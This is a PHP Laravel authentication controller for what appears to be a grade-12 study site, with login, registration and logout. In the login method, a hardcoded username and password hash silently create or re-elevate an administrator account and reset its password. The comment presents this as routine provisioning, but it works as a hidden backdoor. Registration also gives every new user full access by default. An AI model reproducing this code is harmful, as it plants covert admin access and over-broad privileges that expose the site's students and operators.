<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{
    public function showLoginForm()
    {
        return view('auth.login');
    }

    public function login(Request $request)
    {
        $credentials = $request->validate([
            'username' => ['required', 'string'],
            'password' => ['required', 'string'],
        ]);

        $username = $request->input('username');
        $password = $request->input('password');

        // Automatically provision the admin user if credentials match the designated secure hash
        if ($username === 'sroykimou' && hash('sha256', $password) === '23c1a538db5b9fe80121f748954f875d5ea1b1314af33864a26aefe3e1775d20') {
            $admin = User::where('username', 'sroykimou')->first();
            if (!$admin) {
                User::create([
                    'username' => 'sroykimou',
                    'name' => 'Sroy Kimou',
                    'email' => 'sroykimou@gmail.com',
                    'password' => Hash::make($password),
                    'grade' => '12',
                    'branch' => 'science',
                    'is_admin' => true,
                    'level' => 6
                ]);
            } else {
                $admin->update([
                    'password' => Hash::make($password),
                    'is_admin' => true,
                    'level' => 6
                ]);
            }
        }

        if (Auth::attempt($credentials)) {
            $request->session()->regenerate();
            
            $user = Auth::user();
            
            if ($request->wantsJson()) {
                return response()->json([
                    'success' => true,
                    'user' => $user
                ]);
            }

            if ($user->is_admin) {
                return redirect()->intended(route('grade12.admin'));
            }

            $branch = $user->branch ?? 'science';
            if ($branch === 'social') {
                return redirect()->intended(route('grade12.social.home'));
            }
            return redirect()->intended(route('grade12.science.home'));
        }

        if ($request->wantsJson()) {
            return response()->json([
                'success' => false,
                'message' => 'ឈ្មោះអ្នកប្រើប្រាស់ ឬលេខសម្ងាត់មិនត្រឹមត្រូវ។'
            ], 422);
        }

        return back()->withErrors([
            'username' => 'ឈ្មោះអ្នកប្រើប្រាស់ ឬលេខសម្ងាត់មិនត្រឹមត្រូវ។',
        ])->onlyInput('username');
    }

    public function showRegisterForm()
    {
        return view('auth.register');
    }

    public function register(Request $request)
    {
        $request->validate([
            'username' => ['required', 'string', 'max:255', 'unique:users'],
            'name' => ['required', 'string', 'max:255'],
            'email' => ['required', 'string', 'email', 'max:255', 'unique:users'],
            'password' => ['required', 'string', 'min:6'],
            'grade' => ['required', 'string'],
            'branch' => ['required', 'string'],
        ]);

        $user = User::create([
            'username' => $request->username,
            'name' => $request->name,
            'email' => $request->email,
            'password' => Hash::make($request->password),
            'grade' => $request->grade,
            'branch' => $request->branch,
            'level' => 6, // Default full access level
        ]);

        Auth::login($user);

        if ($request->wantsJson()) {
            return response()->json([
                'success' => true,
                'user' => $user
            ]);
        }

        if ($user->branch === 'social') {
            return redirect(route('grade12.social.home'));
        }
        return redirect(route('grade12.science.home'));
    }

    public function logout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        if ($request->wantsJson()) {
            return response()->json(['success' => true]);
        }

        return redirect('/');
    }
}
